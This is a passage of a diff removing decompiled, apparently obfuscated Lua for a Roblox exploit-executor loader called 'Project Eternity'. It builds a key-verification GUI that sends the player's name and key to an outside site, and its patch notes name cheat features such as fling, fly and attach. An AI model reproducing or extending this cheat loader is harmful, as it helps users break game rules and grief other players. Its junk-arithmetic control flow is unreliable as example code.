-									return syn.get_clipboard()
-								end
-							end,
-							function()
-								if Clipboard and typeof(Clipboard.get) == "function" then
-									return Clipboard.get()
-								end
-							end,
-							function()
-								if getrenv and typeof(getrenv().getclipboard) == "function" then
-									return getrenv().getclipboard()
-								end
-							end,
-						}) do
-							local ok, result = pcall(v4)
-
-							if L1.step3 < step8 then
-								if ok and result ~= nil then
-									local str3 = tostring(result)
-									local str4 = string.gsub(str3, "^%s*(.-)%s*$", "%1")
-									if not (#str4 > 0) then
-										continue
-									end
-									return str4
-								end
-
-								continue
-							end
-						end
-
-						return nil
-					end
-
-					local flag10 = false
-					local n207 = nil
-
-					local function onActivated()
-						n207 = 159578992
-						if flag10 then
-							return
-						end
-						flag10 = true
-						local count3 = 719448315
-
-						task.delay(0.25, function()
-							flag10 = false
-							return
-						end)
-
-						pcall(function()
-							if L1.step2 == 872721990 then
-								if v3 then
-									v3:Stop()
-									v3.TimePosition = 0
-									v3:Play()
-								end
-
-								return
-							end
-						end)
-
-						tween(textButton7, { Size = UDim2.new(0, 62, 0, 27), Position = UDim2.new(1, -73, 0.5, -13.5) }, 0.08)
-
-						task.delay(0.08, function()
-							if textButton7 and textButton7.Parent then
-								tween(textButton7, {
-									Size = UDim2.new(0, 68, 0, 30),
-									Position = UDim2.new(1, -76, 0.5, -15),
-								}, 0.15, Enum.EasingStyle.Back, Enum.EasingDirection.Out)
-							end
-
-							if n207 < count3 then
-								return
-							end
-						end)
-
-						local text = getText()
-
-						if text and #text > 0 then
-							textBox2.Text = text
-							textButton7.Text = "Pasted! ✓"
-							textButton7.TextColor3 = Color3.fromRGB(15, 12, 5)
-
-							if step7 ~= 615741932 then
-								count3 = 61319135
-								count -= 1761
-								L1.step4 += 1072
-							end
-
-							textButton7.BackgroundColor3 = Color3.fromRGB(46, 204, 113)
-							ksStatus.Text = "Key loaded from clipboard!"
-							ksStatus.TextColor3 = Color3.fromRGB(80, 220, 130)
-
-							task.delay(1.5, function()
-								local n219 = 728896873
-
-								if textButton7 and textButton7.Parent then
-									textButton7.Text = "Paste"
-									textButton7.TextColor3 = Color3.fromRGB(220, 220, 240)
-									textButton7.BackgroundColor3 = Color3.fromRGB(26, 28, 40)
-								end
-
-								if ksStatus and ksStatus.Text == "Key loaded from clipboard!" then
-									ksStatus.Text = ""
-								end
-
-								if n219 == count then
-								end
-							end)
-						else
-							pcall(function()
-								textBox2:CaptureFocus()
-							end)
-
-							textButton7.Text = "No Clip"
-							textButton7.TextColor3 = Color3.fromRGB(15, 12, 5)
-							textButton7.BackgroundColor3 = Color3.fromRGB(235, 150, 40)
-							ksStatus.Text = "Clipboard empty / unsupported. Tap box to paste directly."
-							ksStatus.TextColor3 = Color3.fromRGB(240, 180, 80)
-
-							task.delay(1.6, function()
-								if textButton7 and textButton7.Parent then
-									textButton7.Text = "Paste"
-									textButton7.TextColor3 = Color3.fromRGB(220, 220, 240)
-
-									textButton7.BackgroundColor3 = Color3.fromRGB(26, 28, 40)
-								end
-
-								if ksStatus and ksStatus.Text == "Clipboard empty / unsupported. Tap box to paste directly." then
-									ksStatus.Text = ""
-								end
-							end)
-						end
-					end
-
-					textButton7.Activated:Connect(onActivated)
-					textButton7.MouseButton1Click:Connect(onActivated)
-				end
-
-				local frame31 = Instance.new("Frame", frame29)
-				frame31.Size = UDim2.new(1, 0, 0, 42)
-				frame31.Position = UDim2.new(0, 0, 0, 126)
-				frame31.BackgroundTransparency = 1
-				frame31.BorderSizePixel = 0
-				frame31.ZIndex = 104
-				local textButton8 = Instance.new("TextButton", frame31)
-				textButton8.Size = UDim2.new(0.48, 0, 1, 0)
-				textButton8.Position = UDim2.new(0, 0, 0, 0)
-				textButton8.Text = "Get Key ↗"
-				textButton8.Font = Enum.Font.GothamBold
-				textButton8.TextSize = 11
-				textButton8.TextColor3 = Color3.fromRGB(230, 230, 245)
-				textButton8.BackgroundColor3 = Color3.fromRGB(24, 25, 36)
-				textButton8.BorderSizePixel = 0
-				textButton8.AutoButtonColor = false
-				textButton8.ZIndex = 104
-				corner(textButton8, 8)
-				stroke(textButton8, tbl17.accent, 1, 0.6)
-				local textButton9 = Instance.new("TextButton", frame31)
-				textButton9.Size = UDim2.new(0.48, 0, 1, 0)
-				textButton9.Position = UDim2.new(0.52, 0, 0, 0)
-				textButton9.Text = "Verify & Launch ▶"
-				textButton9.Font = Enum.Font.GothamBold
-				textButton9.TextSize = 11
-				textButton9.TextColor3 = Color3.fromRGB(15, 12, 5)
-				textButton9.BackgroundColor3 = tbl17.accent
-				textButton9.BorderSizePixel = 0
-				textButton9.AutoButtonColor = false
-				textButton9.ZIndex = 104
-				corner(textButton9, 8)
-				local frame32 = Instance.new("Frame", frame29)
-				frame32.Size = UDim2.new(1, 0, 0, 5)
-				frame32.Position = UDim2.new(0, 0, 0, 180)
-				frame32.BackgroundColor3 = Color3.fromRGB(22, 24, 32)
-				frame32.BackgroundTransparency = 1
-				frame32.BorderSizePixel = 0
-				frame32.ZIndex = 105
-				frame32.ClipsDescendants = true
-				corner(frame32, 3)
-				local frame33 = Instance.new("Frame", frame32)
-				frame33.Size = UDim2.new(0, 0, 1, 0)
-				frame33.BackgroundColor3 = tbl17.accent
-				frame33.BackgroundTransparency = 1
-				frame33.BorderSizePixel = 0
-				frame33.ZIndex = 106
-				corner(frame33, 3)
-				local textLabel11 = Instance.new("TextLabel", frame29)
-				textLabel11.Size = UDim2.new(1, 0, 0, 16)
-				textLabel11.Position = UDim2.new(0, 0, 0, 192)
-				textLabel11.Text = ""
-				textLabel11.Font = Enum.Font.Gotham
-				textLabel11.TextSize = 10
-				textLabel11.TextColor3 = tbl17.danger
-				textLabel11.BackgroundTransparency = 1
-				textLabel11.TextXAlignment = Enum.TextXAlignment.Center
-				textLabel11.ZIndex = 104
-				local textLabel12 = Instance.new("TextLabel", frame29)
-				textLabel12.Size = UDim2.new(1, 0, 0, 32)
-				textLabel12.Position = UDim2.new(0, 0, 0, 214)
-				textLabel12.Text = "Keys grant 24h uninterrupted access.\nNeed assistance? Join our official Discord community."
-				textLabel12.Font = Enum.Font.Gotham
-				textLabel12.TextSize = 9
-				textLabel12.TextColor3 = Color3.fromRGB(100, 100, 120)
-				textLabel12.BackgroundTransparency = 1
-				textLabel12.TextXAlignment = Enum.TextXAlignment.Center
-				textLabel12.ZIndex = 104
-				frame18 = Instance.new("Frame", frame15)
-				frame18.Name = "RightPanel"
-				frame18.Size = UDim2.new(0.28, -7, 1, 0)
-				frame18.Position = UDim2.new(0.72, 7, 0, 0)
-				frame18.BackgroundColor3 = Color3.fromRGB(14, 14, 20)
-				frame18.BackgroundTransparency = 0.35
-				frame18.BorderSizePixel = 0
-				frame18.ZIndex = 102
-
-				do
-					local rightBg, rightScrim, rightStroke = fn17(frame18, 14, Color3.fromRGB(38, 40, 56))
-					tbl21.rightBg = rightBg
-					tbl21.rightScrim = rightScrim
-					tbl21.rightStroke = rightStroke
-				end
-
-				local frame34 = Instance.new("Frame", frame18)
-				frame34.Size = UDim2.new(0, 0, 0, 0)
-				frame34.Visible = false
-
-				do
-					local frame35 = Instance.new("Frame", frame18)
-					frame35.Size = UDim2.new(1, -24, 0, 22)
-					frame35.Position = UDim2.new(0, 12, 0, 12)
-					frame35.BackgroundTransparency = 1
-					frame35.ZIndex = 103
-					local textLabel13 = Instance.new("TextLabel", frame35)
-					textLabel13.Size = UDim2.new(1, 0, 1, 0)
-					textLabel13.Text = "TELEMETRY & SPECS"
-					textLabel13.Font = Enum.Font.GothamBold
-					textLabel13.TextSize = 10
-					textLabel13.TextColor3 = tbl17.accent
-					textLabel13.BackgroundTransparency = 1
-					textLabel13.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel13.ZIndex = 103
-				end
-
-				local frame35 = Instance.new("Frame", frame18)
-				frame35.Size = UDim2.new(1, -24, 0, 1)
-				frame35.Position = UDim2.new(0, 12, 0, 36)
-				frame35.BackgroundColor3 = Color3.fromRGB(32, 34, 48)
-				frame35.BorderSizePixel = 0
-				frame35.ZIndex = 103
-
-				do
-					local frame36 = Instance.new("Frame", frame18)
-					frame36.Name = "TelemetryTab"
-					frame36.Size = UDim2.new(1, -20, 0, 168)
-					frame36.Position = UDim2.new(0, 10, 0, 46)
-					frame36.BackgroundTransparency = 1
-					frame36.BorderSizePixel = 0
-					frame36.ZIndex = 103
-					local uiListLayout2 = Instance.new("UIListLayout", frame36)
-					uiListLayout2.FillDirection = Enum.FillDirection.Vertical
-					uiListLayout2.Padding = UDim.new(0, 6)
-					uiListLayout2.SortOrder = Enum.SortOrder.LayoutOrder
-
-					local function fn21(frame37, layoutOrder, text, text2, color, text3)
-						local frame38 = Instance.new("Frame", frame37)
-						frame38.Size = UDim2.new(1, 0, 0, 50)
-						frame38.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-						frame38.BorderSizePixel = 0
-						frame38.LayoutOrder = layoutOrder
-						frame38.ZIndex = 104
-						corner(frame38, 7)
-						stroke(frame38, Color3.fromRGB(42, 44, 62), 1, 0.5)
-						local instanceNew = Instance.new
-						local str3 = "TextLabel"
-						local textLabel13, textLabel14, tbl22
-
-						instanceNew = instanceNew(str3, frame38)
-						instanceNew.Size = UDim2.new(0.55, 0, 0, 14)
-						instanceNew.Position = UDim2.new(0, 12, 0, 9)
-						instanceNew.Text = text
-						instanceNew.Font = Enum.Font.GothamBold
-						instanceNew.TextSize = 10
-						instanceNew.TextColor3 = Color3.fromRGB(195, 195, 215)
-						instanceNew.BackgroundTransparency = 1
-						instanceNew.TextXAlignment = Enum.TextXAlignment.Left
-						instanceNew.ZIndex = 105
-						textLabel13 = Instance.new("TextLabel", frame38)
-						textLabel13.Size = UDim2.new(0.55, 0, 0, 12)
-						textLabel13.Position = UDim2.new(0, 12, 0, 26)
-						textLabel13.Text = text3
-						textLabel13.Font = Enum.Font.Gotham
-						textLabel13.TextSize = 8
-						textLabel13.TextColor3 = Color3.fromRGB(105, 105, 125)
-						textLabel13.BackgroundTransparency = 1
-						textLabel13.TextXAlignment = Enum.TextXAlignment.Left
-						textLabel13.ZIndex = 105
-						textLabel14 = Instance.new("TextLabel", frame38)
-						textLabel14.Size = UDim2.new(0.45, -12, 0, 20)
-						textLabel14.Position = UDim2.new(0.55, 0, 0.5, -10)
-						textLabel14.Text = text2
-
-						textLabel14.Font = Enum.Font.GothamBold
-						textLabel14.TextSize = 13
-						textLabel14.TextColor3 = color
-						textLabel14.BackgroundTransparency = 1
-						textLabel14.TextXAlignment = Enum.TextXAlignment.Right
-						textLabel14.TextTruncate = Enum.TextTruncate.AtEnd
-						textLabel14.ZIndex = 105
-						return frame38, instanceNew, textLabel14, textLabel13
-					end
-
-					local clientFps, v4, instance2, v5 = fn21(frame36, 1, "CLIENT FPS", "60", Color3.fromRGB(80, 220, 130), "Frame Refresh")
-					local n206 = 2
-					local str3 = "EXECUTOR"
-					local str4
-
-					if getExecutorName then
-						str4 = getExecutorName() or "Unknown"
-					else
-						str4 = "Unknown"
-					end
-
-					local nativeEnvironment, v6, v7, v8 = fn21(frame36, n206, str3, str4, tbl17.accent, "Native Environment")
-					local latency, v9, instance3, v10 = fn21(frame36, 3, "LATENCY", "0ms", Color3.fromRGB(100, 200, 255), "Roblox Network Ping")
-					local frame37 = Instance.new("Frame", frame18)
-					frame37.Size = UDim2.new(1, -20, 0, 1)
-					frame37.Position = UDim2.new(0, 10, 0, 222)
-					frame37.BackgroundColor3 = Color3.fromRGB(32, 34, 48)
-					frame37.BorderSizePixel = 0
-					frame37.ZIndex = 103
-					local frame38 = Instance.new("Frame", frame18)
-					frame38.Size = UDim2.new(0, 0, 0, 0)
-					frame38.Visible = false
-					local textLabel13 = Instance.new("TextLabel", frame18)
-					textLabel13.Size = UDim2.new(1, -20, 0, 16)
-					textLabel13.Position = UDim2.new(0, 10, 0, 230)
-					textLabel13.Text = "LATEST PATCH NOTES"
-					textLabel13.Font = Enum.Font.GothamBold
-					textLabel13.TextSize = 10
-					textLabel13.TextColor3 = tbl17.accent
-					textLabel13.BackgroundTransparency = 1
-					textLabel13.TextXAlignment = Enum.TextXAlignment.Left
-					textLabel13.ZIndex = 104
-					local frame39 = Instance.new("Frame", frame18)
-					frame39.Name = "PatchNotesBox"
-					frame39.Size = UDim2.new(1, -20, 0, 144)
-					frame39.Position = UDim2.new(0, 10, 0, 250)
-					frame39.BackgroundColor3 = Color3.fromRGB(18, 18, 26)
-					frame39.BorderSizePixel = 0
-					frame39.ZIndex = 103
-					corner(frame39, 8)
-					stroke(frame39, Color3.fromRGB(42, 44, 62), 1, 0.5)
-					local uiListLayout3 = Instance.new("UIListLayout", frame39)
-					uiListLayout3.FillDirection = Enum.FillDirection.Vertical
-					uiListLayout3.Padding = UDim.new(0, 4)
-					uiListLayout3.SortOrder = Enum.SortOrder.LayoutOrder
-					local uiPadding2 = Instance.new("UIPadding", frame39)
-					uiPadding2.PaddingTop = UDim.new(0, 5)
-					uiPadding2.PaddingBottom = UDim.new(0, 5)
-					uiPadding2.PaddingLeft = UDim.new(0, 8)
-					uiPadding2.PaddingRight = UDim.new(0, 8)
-
-					for i, v11 in ipairs({
-						"<font color=\"rgb(80, 255, 100)\">+</font> Reworked the loader screen",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Minor rework on dashboard screen",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Keybind, multi-target & tracking in Fling GUI",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Custom attach",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Fixed Fly not working on phone",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Fixed Attach transitions & physics locks",
-						"<font color=\"rgb(80, 255, 100)\">+</font> Multi-Attachment concurrency protection",
-					}) do
-						local textLabel14 = Instance.new("TextLabel", frame39)
-						textLabel14.Size = UDim2.new(1, 0, 0, 15)
-						textLabel14.Text = v11
-						textLabel14.RichText = true
-						textLabel14.Font = Enum.Font.Gotham
-						textLabel14.TextSize = 8.5
-						textLabel14.TextColor3 = Color3.fromRGB(220, 220, 235)
-						textLabel14.BackgroundTransparency = 1
-						textLabel14.TextXAlignment = Enum.TextXAlignment.Left
-						textLabel14.TextTruncate = Enum.TextTruncate.AtEnd
-						textLabel14.LayoutOrder = i
-						textLabel14.ZIndex = 104
-					end
-
-					local count2 = 0
-					local now = tick()
-
-					local connection3 = RunService2.RenderStepped:Connect(function()
-						if frame14 and frame14.Parent then
-							count2 += 1
-							local now2 = tick()
-
-							if now2 - now >= 1 then
-								if instance2 and instance2.Parent then
-									local count3 = count2
-									local color = count3 >= 50
-
-									if color then
-										color = Color3.fromRGB(80, 220, 130)
-									end
-
-									if not color then
-										color = count3 >= 30
-
-										if color then
-											color = Color3.fromRGB(240, 180, 40)
-										end
-
-										color = color or Color3.fromRGB(255, 80, 80)
-									end
-
-									instance2.Text = tostring(count3)
-									instance2.TextColor3 = color
-								end
-
-								count2 = 0
-								now = now2
-							end
-
-							return
-						end
-
-						if fpsConn then
-							fpsConn:Disconnect()
-						end
-					end)
-
-					task.spawn(function()
-						while frame14 and frame14.Parent do
-							pcall(function()
-								local n213 = math.floor(game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString():match("%d+"))
-
-								if instance3 and instance3.Parent then
-									instance3.Text = tostring(n213) .. "ms"
-								end
-							end)
-
-							task.wait(1.5)
-						end
-					end)
-
-					fn16 = function(callback)
-						local count3 = 221961180
-
-						pcall(function()
-							if connection then
-								connection:Disconnect()
-							end
-
-							if connection3 then
-								connection3:Disconnect()
-							end
-						end)
-
-						local currentCamera = workspace.CurrentCamera
-						local viewportSize = currentCamera
-
-						if viewportSize then
-							viewportSize = currentCamera.ViewportSize
-						end
-
-						if viewportSize then
-							viewportSize = currentCamera.ViewportSize.X > 0
-						end
-
-						if viewportSize then
-							viewportSize = currentCamera.ViewportSize.X
-						end
-
-						local n210 = math.max((viewportSize or 1920) * 1.35, 1800)
-						local tween_ = tween
-						local frame40 = frame20
-						local tbl22 = { Position = UDim2.new(0, -n210, 0, 10) }
-						local n211 = 0.65
-						local enum = Enum
-						local exitTo2 = nil
-						local callback2, tbl23
-
-						while true do
-							tween_(frame40, tbl22, n211, enum.EasingStyle.Cubic, Enum.EasingDirection.In)
-							tween(frame16, { Position = UDim2.new(0, -n210, 0, 0) }, 0.65, Enum.EasingStyle.Cubic, Enum.EasingDirection.In)
-							tween(frame17, { Position = UDim2.new(0.28, n210, 0, 0) }, 0.65, Enum.EasingStyle.Cubic, Enum.EasingDirection.In)
-							tween_ = tween
-							frame40 = frame18
-							tbl22 = { Position = UDim2.new(0.72, n210, 0, 0) }
-							enum = Enum.EasingStyle.Cubic
-							local enum2 = Enum
-							local exitTo = nil
-
-							while true do
-								enum2 = enum2.EasingDirection.In
-								tween_(frame40, tbl22, n211, enum, enum2)
-
-								if imageLabel5 then
-									frame40 = imageLabel5
-									tbl22 = { ImageTransparency = 1 }
-									enum = Enum.EasingStyle.Sine
-									enum2 = Enum.EasingDirection.InOut
-									tween(frame40, tbl22, n211, enum, enum2)
-								end
-
-								if uiScale then
-									if count3 < step7 then
-										exitTo = 2
-										break
-									end
-
-									L1.step2 += 1611
-									L1.step4 = 211875457
-									step7 = 92867228
-									L1.step3 -= 716
-									step6 += 1124
-									step += 1995
-									count -= 658
-									tween_ = step8 - 406
-									step8 = tween_
-									count3 += 698
-
-									exitTo = 3
-									break
-								else
-									exitTo = 1
-									break
-								end
-							end
-
-							if exitTo == 1 then
-								exitTo2 = 1
-								break
-							elseif exitTo == 2 then
-								exitTo2 = 2
-								break
-							end
-
-							break
-						end
-
-						if exitTo2 ~= 1 then
-							tween(uiScale, { Scale = 1.04 }, 0.65, Enum.EasingStyle.Sine, Enum.EasingDirection.In)
-						end
-
-						tween(frame13, { BackgroundTransparency = 1 }, 0.65, Enum.EasingStyle.Sine, Enum.EasingDirection.InOut)
-						tween(frame12, { BackgroundTransparency = 1 }, 0.65)
-						task.wait(0.68)
-
-						if typeof(callback) == "function" then
-							callback()
-						end
-					end
-				end
-
-				do
-					local currentCamera = workspace.CurrentCamera
-					local viewportSize = currentCamera
-
-					if viewportSize then
-						viewportSize = currentCamera.ViewportSize
-					end
-
-					if viewportSize then
-						viewportSize = currentCamera.ViewportSize.X > 0
-					end
-
-					if viewportSize then
-						viewportSize = currentCamera.ViewportSize.X
-					end
-
-					local n206 = math.max((viewportSize or 1920) * 1.35, 1800)
-					local targetScale = tbl21.targetScale
-
-					if not targetScale then
-						targetScale = uiScale2
-
-						if targetScale then
-							targetScale = uiScale2.Scale
-						end
-					end
-
-					tbl21.baseScale = targetScale or 1
-					frame14.BackgroundTransparency = 1
-					frame14.Position = udim23
-					uiScale2.Scale = tbl21.baseScale
-					frame20.Position = UDim2.new(0, -n206, 0, 10)
-					frame16.Position = UDim2.new(0, -n206, 0, 0)
-					frame17.Position = UDim2.new(0.28, n206, 0, 0)
-					frame18.Position = UDim2.new(0.72, n206, 0, 0)
-				end
-
-				if imageLabel5 then
-					imageLabel5.ImageTransparency = 1
-				end
-
-				if uiScale then
-					uiScale.Scale = 1.06
-				end
-
-				frame12.BackgroundTransparency = 1
-				frame13.BackgroundTransparency = 1
-				screenGui2.Parent = localPlayer_2:WaitForChild("PlayerGui")
-
-				do
-					task.spawn(function()
-						task.wait(0.04)
-
-						if imageLabel5 then
-							tween(imageLabel5, { ImageTransparency = 0.05 }, 0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-						end
-
-						if uiScale then
-							tween(uiScale, { Scale = 1 }, 1.05, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-						end
-
-						tween(frame13, { BackgroundTransparency = 0.4 }, 0.85, Enum.EasingStyle.Sine, Enum.EasingDirection.Out)
-						tween(frame12, { BackgroundTransparency = 1 }, 0.7)
-						tween(frame16, { Position = UDim2.new(0, 0, 0, 0) }, 0.68, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-						tween(frame18, { Position = UDim2.new(0.72, 7, 0, 0) }, 0.68, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-						local count3 = 544845613
-						task.wait(0.08)
-						tween(frame20, { Position = UDim2.new(0, 10, 0, 10) }, 0.68, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-						tween(frame17, { Position = UDim2.new(0.28, 3, 0, 0) }, 0.68, Enum.EasingStyle.Quart, Enum.EasingDirection.Out)
-						textLabel7.Text = ""
-
-						task.spawn(function()
-							for i = 1, 16 do
-								textLabel7.Text = string.sub("PROJECT ETERNITY", 1, i)
-								task.wait(0.03)
-							end
-
-							if count3 < L1.step3 then
-								return
-							end
-							L1.step3 = 719217964
-							step6 -= 307
-							step7 += 1354
-							count3 += 885
-							L1.step2 = 762095838
-							count = 875791499
-							return nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil, nil
-						end)
-
-						frame21.BackgroundTransparency = 0
-						local offset = 160
-
-						if frame21.Size.X.Offset > 0 then
-							offset = frame21.Size.X.Offset
-						end
-
-						tween(frame21, { Size = UDim2.new(0, offset, 0, 2) }, 0.75, Enum.EasingStyle.Quint, Enum.EasingDirection.Out)
-					end)
-				end
-
-				task.spawn(function()
-					while frame14 and frame14.Parent do
-						task.wait(0.02)
-
-						if uiGradient3 and uiGradient3.Parent then
-							uiGradient3.Rotation = (uiGradient3.Rotation + 3) % 360
-						end
-
-						if uiGradient and uiGradient.Parent then
-							uiGradient.Rotation = (uiGradient.Rotation + 2.5) % 360
-						end
-
-						if uiGradient2 and uiGradient2.Parent then
-							uiGradient2.Rotation = (uiGradient2.Rotation + 3) % 360
-						end
-					end
-				end)
-
-				do
-					local flag10 = false
-					local flag11 = false
-
-					textButton8.MouseEnter:Connect(function()
-						if step == 948147176 then
-							tween(textButton8, { BackgroundColor3 = Color3.fromRGB(30, 30, 40) }, 0.15)
-							return
-						end
-					end)
-
-					textButton8.MouseLeave:Connect(function()
-						tween(textButton8, { BackgroundColor3 = Color3.fromRGB(22, 22, 30) }, 0.15)
-						return
-					end)
-
-					textButton9.MouseEnter:Connect(function()
-						tween(textButton9, { Size = UDim2.new(0.5, 0, 1, 2) }, 0.15)
-					end)
-
-					textButton9.MouseLeave:Connect(function()
-						if L1.step2 == 872721990 then
-							tween(textButton9, { Size = UDim2.new(0.48, 0, 1, 0) }, 0.15)
-							return
-						end
-					end)
-
-					textBox2.Focused:Connect(function()
-						tween(frame30, {}, 0.1)
-
-						pcall(function()
-							for _, child in ipairs(frame30:GetChildren()) do
-								if child:IsA("UIStroke") then
-									tween(child, { Color = tbl17.accent, Transparency = 0.2 }, 0.2)
-								end
-							end
-						end)
-					end)
-
-					textBox2.FocusLost:Connect(function()
-						pcall(function()
-							local packed = table.pack(ipairs(frame30:GetChildren()))
-							local callback = (function(...) local f, s, c = ... return coroutine.wrap(function() for k, v4, v32, v42, v5, v6, v7, v8 in f, s, c do coroutine.yield(true, k, v4, v32, v42, v5, v6, v7, v8) end end) end)(packed[1], packed[2], packed[3])
-							local uiStroke
-							local packed2
-
-							while true do
-								packed2 = table.pack(callback())
-
-								if not packed2[1] then
-									return
-								end
-
-								uiStroke = packed2[3]
-
-								if not uiStroke:IsA("UIStroke") then
-									continue
-								end
-
-								tween(uiStroke, { Color = tbl17.divider, Transparency = 0.4 }, 0.2)
-							end
-						end)
-					end)
-
-					textButton8.MouseButton1Click:Connect(function()
-						pcall(function()
-							v3:Play()
-							if step8 == 975380873 then
-								return
-							end
-							step = 118643399
-							step8 = 1037741131
-							local n218 = step7 + 692
-						end)
-
-						local flag12 = false
-
-						pcall(function()
-							if setclipboard then
-								setclipboard("https://zeternity.online/getkey")
-								textLabel11.Text = "Link copied! Paste in browser."
-								textLabel11.TextColor3 = Color3.fromRGB(80, 220, 130)
-								flag12 = true
-							end
-
-							if step == 948147176 then
-								return
-							end
-						end)
-
-						if not flag12 then
-							textLabel11.Text = "Go to: https://zeternity.online/getkey"
-							textLabel11.TextColor3 = Color3.fromRGB(100, 200, 255)
-						end
-
-						task.delay(4, function()
-							if textLabel11 and textLabel11.Parent then
-								textLabel11.Text = ""
-							end
-
-							if L1.step3 == 921534274 then
-								L1.step2 -= 1183
-								step7 = 314612706
-								L1.step3 += 951
-								L1.step4 += 8
-								step -= 68
-								return
-							end
-						end)
-					end)
-
-					local flag12 = false
-
-					textButton9.MouseButton1Click:Connect(function()
-						local localPlayer_3 = Players_2
-
-						if localPlayer_3 then
-							localPlayer_3 = Players_2.LocalPlayer
-						end
-
-						local n218, n219, text, udim24, n220
-
-						if not localPlayer_3 then
-							localPlayer_3 = game:GetService("Players")
-
-							if localPlayer_3 then
-								localPlayer_3 = game:GetService("Players").LocalPlayer
-							end
-
-							-- Blacklist check removed
-
-							if flag12 then
-								return
-							end
-							text = textBox2.Text
-
-							if text and not (#text < 4) then
-								flag12 = true
-
-								if step6 == 361451889 then
-									pcall(function()
-										v3:Play()
-									end)
-
-									textButton9.Text = "Verifying..."
-									textLabel11.Text = ""
-									udim24 = UDim2.new(0, 0, 1, 0)
-									frame33.Size = udim24
-									frame33.BackgroundTransparency = 0
-									frame32.BackgroundTransparency = 0.35
-									tween(frame33, { Size = UDim2.new(0.4, 0, 1, 0) }, 0.3, Enum.EasingStyle.Quad)
-
-									task.spawn(function()
-										local localPlayer_4 = Players_2
-
-										if localPlayer_4 then
-											localPlayer_4 = Players_2.LocalPlayer
-										end
-
-										local name4
-
-										if not localPlayer_4 then
-											localPlayer_4 = game:GetService("Players")
-
-											if localPlayer_4 then
-												localPlayer_4 = game:GetService("Players").LocalPlayer
-											end
-
-											name4 = localPlayer_4
-
-											if name4 then
-												name4 = localPlayer_4.Name
-											end
-										else
-											name4 = localPlayer_4.Name
-										end
-
-										name4 = name4 or ""
-										task.wait(0.2)
-										tween(frame33, { Size = UDim2.new(0.7, 0, 1, 0) }, 0.5, Enum.EasingStyle.Quad)
-
-										local ok, result = pcall(function()
-											return safeHttpGet("https://zeternity.online/api/key/verify?user=" .. name4 .. "&key=" .. text)
-										end)
-
-										if ok and result then
-											local str3 = string.lower(string.gsub(tostring(result), "%s+", ""))
-
-											if string.sub(str3, 1, 4) == "true" then
-												pcall(function()
-													if fetchCustomTags then
-														fetchCustomTags()
-													end
-
-													local getgenv_ = L1.fetchRemoteWhitelist
-
-													if not getgenv_ then
-														getgenv_ = getgenv
-
-														if getgenv_ then
-															getgenv_ = getgenv().fetchRemoteWhitelist
-														end
-													end
-
-													if getgenv_ then
-														getgenv_()
-													end
-												end)
-
-												tween(frame33, {
-													Size = UDim2.new(1, 0, 1, 0),
-													BackgroundColor3 = Color3.fromRGB(80, 220, 130),
-												}, 0.25, Enum.EasingStyle.Quad)
-												textButton9.Text = "Verified!"
-												tween(textButton9, { BackgroundColor3 = Color3.fromRGB(60, 190, 110) }, 0.2)
-												textLabel11.Text = "Key accepted!"
-
-												textLabel11.TextColor3 = Color3.fromRGB(80, 220, 130)
-												task.wait(0.5)
-
-												if typeof(fn16) == "function" then
-													fn16(function()
-														frame12.Visible = false
-
-														pcall(function()
-															if tbl20 then
-																tbl20:Stop()
-																tbl20:Destroy()
-															end
-														end)
-													end)
-												else
-													tween(frame12, { BackgroundTransparency = 1 }, 0.35)
-													task.wait(0.35)
-													frame12.Visible = false
-												end
-
-												getgenv().EternityLoaderSuccess = true
-												getgenv().EternityIsWhitelisted = false
-
-												if typeof(fn19) == "function" then
-													fn19(false)
-												end
-
-												flag9 = true
-												flag8 = true
-											else
-												tween(frame33, {
-													Size = UDim2.new(1, 0, 1, 0),
-													BackgroundColor3 = tbl17.danger,
-												}, 0.2)
-												textButton9.Text = "Invalid Key"
-												tween(textButton9, {
-													BackgroundColor3 = tbl17.danger,
-													TextColor3 = Color3.fromRGB(255, 255, 255),
-												}, 0.2)
-												local text2 = "Invalid or expired key."
-
-												if string.find(str3, "expired") then
-													text2 = "Key has expired. Get a new one."
-												elseif string.find(str3, "already_used") then
-													text2 = "Key already used by another user."
-												end
-
-												textLabel11.Text = text2
-												textLabel11.TextColor3 = tbl17.danger
-												task.wait(1.5)
-												tween(frame33, { BackgroundTransparency = 1 }, 0.2)
-												tween(frame32, { BackgroundTransparency = 1 }, 0.2)
-												frame33.Size = UDim2.new(0, 0, 1, 0)
-												frame33.BackgroundColor3 = tbl17.accent
-												tween(textButton9, {
-													BackgroundColor3 = tbl17.accent,
-													TextColor3 = Color3.fromRGB(15, 12, 5),
-												}, 0.2)
-												textButton9.Text = "Verify"
-												flag12 = false
-											end
-										else
-											tween(frame33, {
-												Size = UDim2.new(1, 0, 1, 0),
-												BackgroundColor3 = tbl17.danger,
-											}, 0.2)
-											textButton9.Text = "Error"
-											tween(textButton9, {
-												BackgroundColor3 = tbl17.danger,
-												TextColor3 = Color3.fromRGB(255, 255, 255),
-											}, 0.2)
-											textLabel11.Text = "Connection failed. Try again."
-											textLabel11.TextColor3 = tbl17.danger
-											local taskWait = task.wait
-											taskWait(1.5)
-											tween(frame33, { BackgroundTransparency = 1 }, 0.2)
-											tween(frame32, { BackgroundTransparency = 1 }, 0.2)
